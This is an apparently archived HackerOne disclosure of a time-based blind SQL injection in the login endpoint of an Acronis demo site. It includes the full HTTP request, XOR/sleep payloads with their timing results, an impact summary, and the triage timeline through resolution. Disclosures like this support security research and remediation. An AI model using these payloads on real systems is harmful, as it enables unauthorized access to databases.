---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2024-08-28
submitted: 2021-12-27T16:10:36.479Z
bounty_usd: null
votes: 49
cve: []
program: "[[programs/acronis|Acronis]]"
reporter: "mmg"
source: "https://hackerone.com/reports/1436751"
title: "SQL injection in https://demor.adr.acronis.com/ via the username parameter"
---
# SQL injection in https://demor.adr.acronis.com/ via the username parameter

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 49 | **Program:** Acronis | **Disclosed:** 2024-08-28

- Report: [https://hackerone.com/reports/1436751](https://hackerone.com/reports/1436751)
- CWE: SQL Injection
- Submitted: 2021-12-27T16:10:36.479Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I have discovered a SQL injection in https://demor.adr.acronis.com/  using the POST request via the username parameter.
Using the Repearter in Burpsuite I have submitted the following POST request:

POST /ng/api/auth/login HTTP/2
Host: demor.adr.acronis.com
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Referer: https://demor.adr.acronis.com/
Cookie: PHPSESSID=bsrq24l7g5fmth5b683v2b3gu4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
Content-Length: 148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36

{"username":"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z","id":"27","password":"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956"}

Which resulted in a 35 seconds delayed response (one of the print screens, named 35 captured this).


Using various values for the sleep function you get various time responses. 

0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.336
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.332
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.352
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.327
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.337

I have attached two print screens from burp showing 16 and 35 seconds responses that were used in the payloads.

## Impact

An attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database.
This can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

## Timeline

- **Report Filed**
- **2021-12-27** @security-bot: Hi @mmg

Thanks for participating in Acronis bug bounty program!
Our security team usually replies within 1-2 business days.
❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️
🎄&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;🦌🦌🦌🦌🦌🦌🦌🦌🦌🛷🎅
Expect longer response times due to winter holidays.

Meanwhile, I'd recommend you to check out our [policy](https://hackerone.com/acronis).
- **Report Duplicate**
- **2022-01-04** @mmg: Dear @iradostev,

Thank you for the update and i wish you a Happy New Year!

Regards
@mmg
- **2022-01-04** @iradostev: Thanks @mmg! Have a wonderful year
We'll be waiting for new reports from you
- **2022-01-04** @mmg: Dear @iradostev,

I have a question about the duplicate report because it seems is not the same as mine...
My injection is in /ng/api/auth/login and the format is JSON based.

Can you please double-check this ?

Thank you!

Regards
@mmg
- **2022-01-04** @mmg: Also, I have noticed that the server's response is different as well...

Regards
@mmg
- **Report Reopened**
- **Report Severity Updated**
- **Report Triaged**
- **2022-01-04** @iradostev: You are right @mmg, the fix for #1360323 does not resolve this issue.
- **2022-01-04** @mmg: Dear @iradostev,

Thank you for double-checking!

Regards
@mmg
- **Bounty Awarded**
- **2022-04-05** @mmg: Thank you for the bounty and have a great day!

Regards
@mmg
- **Report Resolved**
- **2022-04-08** @mmg: Thank you for the update!
Please let me know if I should expect a retest request.

Regards
@mmg
- **Agreed On Going Public**
- **Manually Disclosed**
